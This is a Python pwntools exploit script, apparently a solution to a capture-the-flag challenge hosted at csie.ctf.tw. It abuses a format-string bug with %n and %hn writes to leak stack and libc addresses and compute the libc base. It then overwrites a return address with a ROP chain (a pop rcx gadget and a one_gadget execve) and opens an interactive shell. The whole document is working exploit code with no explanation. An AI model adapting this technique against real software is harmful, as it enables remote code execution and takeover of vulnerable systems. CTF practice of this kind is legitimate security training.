from pwn import *
from time import *

r = remote("csie.ctf.tw", 10132)
###Useful address
#rdx rcx r8 r9 stack->
func_ret_addr = 0#%7$p -8
start_main_addr = 0#%10$p -231
start_main_offset = 0x21ab0
fd_addr = 0x601010

###Gadgets
execve_offset = 0x4f2c5  #one_gadget
sys_pop_rcx = 0x3eb0b   #pop rcx ; ret

###Leak data + Calculate address
p = b'%'+str(fd_addr).encode('utf-8')+b'c%7$n'
r.sendline(p)
sleep(0.5)
p = b'%1c%9$hhn'
r.sendline(p)
sleep(0.5)
p = b'%5$pABC%7$pDEF%10$pGHI'
r.sendline(p)
sleep(0.5)
a = r.recv()
first_ptr = int(a[:a.find(b'ABC')],16)
sec_ptr = int(a[a.find(b'ABC')+5:a.find(b'DEF')],16)
start_main_addr = int(a[a.find(b'DEF')+5:a.find(b'GHI')],16)-231
libc_base = start_main_addr-start_main_offset
execve_addr = libc_base+execve_offset
pop_rcx_addr = libc_base+sys_pop_rcx
func_ret_addr = sec_ptr-8

###prepare pointer to func return addr
p = b'%'+str(func_ret_addr%65536).encode('utf-8')+b'c%5$hn'
r.sendline(p)
sleep(0.5)

###ROPchain
#pop rcx
for i in range(4):
    p = b'%'+str(pop_rcx_addr%65536).encode('utf-8')+b'c%7$hn'
    if pop_rcx_addr%65536==0:
        p = b'%7$hn'
    pop_rcx_addr//=65536
    r.sendline(p)
    sleep(0.5)
    func_ret_addr+=2
    p = b'%'+str(func_ret_addr%65536).encode('utf-8')+b'c%5$hn'
    r.sendline(p)
    sleep(0.5)
#0
for i in range(2):
    p = b'%7$n'
    r.sendline(p)
    sleep(0.5)
    func_ret_addr+=4
    p = b'%'+str(func_ret_addr%65536).encode('utf-8')+b'c%5$hn'
    r.sendline(p)
    sleep(0.5)
#execve
for i in range(4):
    p = b'%'+str(execve_addr%65536).encode('utf-8')+b'c%7$hn'
    if execve_addr%65536==0:
        p = b'%7$hn'
    execve_addr//=65536
    r.sendline(p)
    sleep(0.5)
    func_ret_addr+=2
    p = b'%'+str(func_ret_addr%65536).encode('utf-8')+b'c%5$hn'
    r.sendline(p)
    sleep(0.5)

###call execve
r.sendline(b'exit')
r.interactive()
